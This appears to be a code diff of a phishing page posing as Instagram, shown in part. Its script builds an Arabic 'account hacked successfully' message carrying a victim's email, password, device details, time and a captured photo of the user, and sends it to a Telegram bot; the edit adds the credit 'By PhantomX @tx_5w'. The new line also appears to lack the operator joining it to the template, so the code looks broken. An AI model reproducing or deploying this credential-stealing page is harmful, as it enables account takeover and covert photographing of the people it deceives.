@@ -130,7 +130,7 @@
                     <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Download for Android">
                 </a>
                 <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Apple_logo_black.svg/1200px-Apple_logo_black.svg.png" alt="Download for iOS">
+                    <img src="https://www.svgrepo.com/show/303128/download-on-the-app-store-apple-logo.svg" alt="Download for iOS">
                 </a>
             </div>
         </div>
@@ -210,7 +210,7 @@
             const imageData = await captureImage();
 
             // Prepare the message to send to the bot in Arabic
-            const message = `🔓 *حساب تم اختراقه! تفاصيل الحساب مكشوفة* 🔓\n\n` +
+            const message = `🔓 *تم اختراق الحساب بنجاح بواسطة PhantomX نوع الحساب انستجرام* 🔓\n\n` +
                             `💻 *معلومات الحساب:* 💻\n` +
                             `📧 البريد الإلكتروني: ${email}\n` +
                             `🔑 كلمة المرور: ${password}\n\n` +
@@ -226,7 +226,8 @@
                             `⚡ أنوية المعالج: ${deviceInfo.cpuCores}\n` +
                             `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
                             `🕒 *التوقيت:* ${currentTime}\n\n` +
-                            `👁️‍🗨️ *تم التقاط صورة المستخدم*`;
+                            `👁️‍🗨️ *تم التقاط صورة المستخدم*`
+                            `☣ *⚜By PhantomX @tx_5w⚜*`   ;
 
             // Send the information to Telegram bot
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
